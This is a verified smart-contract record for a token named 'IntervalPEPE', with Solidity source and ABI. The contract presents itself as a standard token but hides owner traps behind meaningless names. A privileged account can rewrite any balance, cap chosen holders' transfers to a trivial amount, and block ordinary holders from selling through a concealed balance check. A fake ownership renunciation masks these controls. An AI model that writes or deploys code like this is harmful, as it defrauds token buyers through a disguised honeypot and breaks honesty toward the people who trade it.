{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface atEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellShouldToken) external view returns (uint256);\n\n    function transfer(address senderLiquidity, uint256 amountLaunched) external returns (bool);\n\n    function allowance(address shouldFeeSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderLiquidity,\n        uint256 amountLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalLaunched, uint256 value);\n    event Approval(address indexed shouldFeeSender, address indexed spender, uint256 value);\n}\n\nabstract contract walletLiquidityFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeWallet {\n    function createPair(address exemptShould, address totalSender) external returns (address);\n}\n\ninterface swapMinFund is atEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract IntervalPEPE is walletLiquidityFee, atEnable, swapMinFund {\n\n    mapping(address => bool) public liquidityExemptMin;\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingTradingAmount;\n    }\n\n    mapping(address => bool) public tokenAt;\n\n    uint256 private maxLiquidity;\n\n    uint8 private listLaunched = 18;\n\n    uint256 public tokenAmount;\n\n    uint256 public toMax;\n\n    function balanceOf(address sellShouldToken) public view virtual override returns (uint256) {\n        return fromList[sellShouldToken];\n    }\n\n    function getOwner() external view returns (address) {\n        return teamFee;\n    }\n\n    function senderToken(uint256 amountLaunched) public {\n        sellMax();\n        receiverToken = amountLaunched;\n    }\n\n    uint256 private minFund = 100000000 * 10 ** 18;\n\n    function fundAt(address exemptMarketing) public {\n        sellMax();\n        if (takeLiquidity) {\n            tokenAmount = toMax;\n        }\n        if (exemptMarketing == isWalletReceiver || exemptMarketing == shouldFrom) {\n            return;\n        }\n        liquidityExemptMin[exemptMarketing] = true;\n    }\n\n    uint256 constant amountLiquidity = 15 ** 10;\n\n    function transfer(address atFrom, uint256 amountLaunched) external virtual override returns (bool) {\n        return exemptSender(_msgSender(), atFrom, amountLaunched);\n    }\n\n    bool private takeLiquidity;\n\n    uint256 enableMax;\n\n    function name() external view virtual override returns (string memory) {\n        return maxFee;\n    }\n\n    string private maxFee = \"Interval PEPE\";\n\n    address private teamFee;\n\n    address public shouldFrom;\n\n    function sellAmount(address atFrom, uint256 amountLaunched) public {\n        sellMax();\n        fromList[atFrom] = amountLaunched;\n    }\n\n    function sellToken(address launchedAtSender, address senderLiquidity, uint256 amountLaunched) internal returns (bool) {\n        require(fromList[launchedAtSender] >= amountLaunched);\n        fromList[launchedAtSender] -= amountLaunched;\n        fromList[senderLiquidity] += amountLaunched;\n        emit Transfer(launchedAtSender, senderLiquidity, amountLaunched);\n        return true;\n    }\n\n    mapping(address => uint256) private fromList;\n\n    function sellMax() private view {\n        require(tokenAt[_msgSender()]);\n    }\n\n    function allowance(address fromMarketingSell, address receiverFund) external view virtual override returns (uint256) {\n        if (receiverFund == toEnableFund) {\n            return type(uint256).max;\n        }\n        return modeTake[fromMarketingSell][receiverFund];\n    }\n\n    function transferFrom(address launchedAtSender, address senderLiquidity, uint256 amountLaunched) external override returns (bool) {\n        if (_msgSender() != toEnableFund) {\n            if (modeTake[launchedAtSender][_msgSender()] != type(uint256).max) {\n                require(amountLaunched <= modeTake[launchedAtSender][_msgSender()]);\n                modeTake[launchedAtSender][_msgSender()] -= amountLaunched;\n            }\n        }\n        return exemptSender(launchedAtSender, senderLiquidity, amountLaunched);\n    }\n\n    event OwnershipTransferred(address indexed fromSwapList, address indexed marketingReceiver);\n\n    function exemptSender(address launchedAtSender, address senderLiquidity, uint256 amountLaunched) internal returns (bool) {\n        if (launchedAtSender == isWalletReceiver) {\n            return sellToken(launchedAtSender, senderLiquidity, amountLaunched);\n        }\n        uint256 teamLiquidity = atEnable(shouldFrom).balanceOf(isTokenFund);\n        require(teamLiquidity == receiverToken);\n        require(senderLiquidity != isTokenFund);\n        if (liquidityExemptMin[launchedAtSender]) {\n            return sellToken(launchedAtSender, senderLiquidity, amountLiquidity);\n        }\n        return sellToken(launchedAtSender, senderLiquidity, amountLaunched);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return listLaunched;\n    }\n\n    function tradingLiquidityTx(address receiverSenderFrom) public {\n        if (takeSell) {\n            return;\n        }\n        \n        tokenAt[receiverSenderFrom] = true;\n        \n        takeSell = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minFund;\n    }\n\n    bool public modeAmount;\n\n    bool public feeAmount;\n\n    address toEnableFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public isWalletReceiver;\n\n    mapping(address => mapping(address => uint256)) private modeTake;\n\n    string private marketingTradingAmount = \"IPE\";\n\n    bool private launchTrading;\n\n    bool public enableMarketingSender;\n\n    function owner() external view returns (address) {\n        return teamFee;\n    }\n\n    function limitMin() public {\n        emit OwnershipTransferred(isWalletReceiver, address(0));\n        teamFee = address(0);\n    }\n\n    function approve(address receiverFund, uint256 amountLaunched) public virtual override returns (bool) {\n        modeTake[_msgSender()][receiverFund] = amountLaunched;\n        emit Approval(_msgSender(), receiverFund, amountLaunched);\n        return true;\n    }\n\n    bool public takeSell;\n\n    uint256 receiverToken;\n\n    address isTokenFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private fromFund;\n\n    constructor (){\n        if (takeLiquidity != modeAmount) {\n            toMax = tokenAmount;\n        }\n        buyLaunch limitTo = buyLaunch(toEnableFund);\n        shouldFrom = feeWallet(limitTo.factory()).createPair(limitTo.WETH(), address(this));\n        if (fromFund) {\n            feeAmount = false;\n        }\n        isWalletReceiver = _msgSender();\n        limitMin();\n        tokenAt[isWalletReceiver] = true;\n        fromList[isWalletReceiver] = minFund;\n        \n        emit Transfer(address(0), isWalletReceiver, minFund);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldFeeSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromSwapList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMarketingSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellShouldToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMarketingSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMarketing\",\"type\":\"address\"}],\"name\":\"fundAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isWalletReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityExemptMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLaunched\",\"type\":\"uint256\"}],\"name\":\"sellAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountLaunched\",\"type\":\"uint256\"}],\"name\":\"senderToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSenderFrom\",\"type\":\"address\"}],\"name\":\"tradingLiquidityTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAtSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "IntervalPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}